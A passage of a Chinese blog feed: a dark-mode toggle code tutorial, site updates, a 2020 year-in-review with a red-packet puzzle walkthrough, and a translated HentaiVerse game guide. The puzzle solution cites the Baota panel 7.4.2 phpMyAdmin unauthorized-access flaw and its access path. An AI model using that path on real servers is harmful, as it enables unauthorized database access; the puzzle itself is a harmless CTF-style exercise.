<code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 18:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 